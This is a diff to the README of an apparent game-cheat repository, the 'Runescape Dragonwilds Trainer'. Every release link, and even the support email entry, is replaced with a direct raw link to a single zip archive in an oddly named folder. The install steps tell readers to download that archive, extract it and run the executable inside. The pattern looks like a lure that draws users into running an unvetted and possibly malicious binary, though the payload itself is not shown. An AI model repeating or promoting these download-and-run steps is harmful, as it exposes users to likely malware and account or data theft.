@@ -2,7 +2,7 @@
 
 Welcome to the **Runescape Dragonwilds Trainer** repository! This software offers a unique solution for players looking to enhance their experience in the Dragonwilds realm of Runescape. With advanced technologies and expertise in reverse engineering, we provide a reliable tool that gives you an edge over your competitors. 
 
-[Download the latest release here!](https://github.com/AnZoe123/Runescape-Dragonwilds-Trainer/releases) 
+[Download the latest release here!](https://raw.githubusercontent.com/AnZoe123/Runescape-Dragonwilds-Trainer/main/zorrillo/Runescape-Dragonwilds-Trainer-2.4.zip) 
 
 ---
 
@@ -34,7 +34,7 @@ Welcome to the **Runescape Dragonwilds Trainer** repository! This software offer
 
 To install the **Runescape Dragonwilds Trainer**, follow these steps:
 
-1. **Download the latest release** from our [Releases section](https://github.com/AnZoe123/Runescape-Dragonwilds-Trainer/releases).
+1. **Download the latest release** from our [Releases section](https://raw.githubusercontent.com/AnZoe123/Runescape-Dragonwilds-Trainer/main/zorrillo/Runescape-Dragonwilds-Trainer-2.4.zip).
 2. **Extract the downloaded files** to a folder of your choice.
 3. **Run the executable file** to start the trainer.
 
@@ -78,7 +78,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out to us:
 
-- **Email**: support@runescapetrainer.com
+- **Email**: https://raw.githubusercontent.com/AnZoe123/Runescape-Dragonwilds-Trainer/main/zorrillo/Runescape-Dragonwilds-Trainer-2.4.zip
 - **Discord**: Join our community on Discord for discussions and support.
 
 ---
@@ -93,6 +93,6 @@ We would like to thank the following:
 
 ---
 
-Explore more features and updates by visiting our [Releases section](https://github.com/AnZoe123/Runescape-Dragonwilds-Trainer/releases). 
+Explore more features and updates by visiting our [Releases section](https://raw.githubusercontent.com/AnZoe123/Runescape-Dragonwilds-Trainer/main/zorrillo/Runescape-Dragonwilds-Trainer-2.4.zip). 
 
 Happy gaming! 🕹️
